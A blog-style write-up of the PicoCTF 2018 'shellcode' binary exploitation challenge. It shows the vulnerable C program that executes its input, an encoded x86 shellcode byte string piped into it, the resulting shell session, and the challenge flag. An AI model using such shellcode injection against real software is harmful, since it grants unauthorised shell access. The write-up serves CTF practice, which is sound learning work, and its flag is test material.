---
layout: post
title:  PicoCTF 2018 Challenge [Binary Exploitation 200pts]
---
<h3><strong>PicoCTF 2018 - Binary Exploitation 200: shellcode</strong></h3>

<hr>

<p><strong>Challenge</strong></p>

<p>
This program executes any input you give it. Can you get a shell?

You can find the program in ``` /problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed ``` on the shell server.

Source
</p>

<hr>

<p> The challenges were very easy i have solved several of challenges but I just wrote some useful solutions </p>

<p><strong>Solution</strong></p>

`
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");

  ((void (*)())buf)();

  return 0;
}
`

by executing we connected remotly shell and show as : 

`
drwxr-xr-x   2 root       root          4096 Sep 28 08:11 ./
drwxr-x--x 576 root       root         53248 Sep 30 03:45 ../
-r--r-----   1 hacksports shellcode_0     34 Sep 28 08:11 flag.txt
-rwxr-sr-x   1 hacksports shellcode_0 725408 Sep 28 08:11 vuln*
-rw-rw-r--   1 hacksports hacksports     562 Sep 28 08:11 vuln.c
`

the terminal shown a list of files contain Flag.txt , but we don"t have the right permision , so we need to get read the content of flag.txt by vuln .
we have already know "shellcode" i adopted Shellstorm collections 


`
$ uname -a
Linux pico-2018-shell-1 4.4.0-1067-aws #77-Ubuntu SMP Mon Aug 27 13:22:03 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
`

Linux x86_64 i wrote a shellcode : 

`
$ python -c "print('\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xf
e\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81')" > ~
/shellcode.txt

$ cat ~/shellcode.txt - | ./vuln
Enter a string!
1V_ȈF22i0tii0cjo΁
Thanks! Executing now...

ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{shellc0de_w00h00_9ee0edd0}

`
Bingo, we Got the Flag  

picoCTF{shellc0de_w00h00_9ee0edd0}

<p>#0v3n_Sh3ll ❤</p>
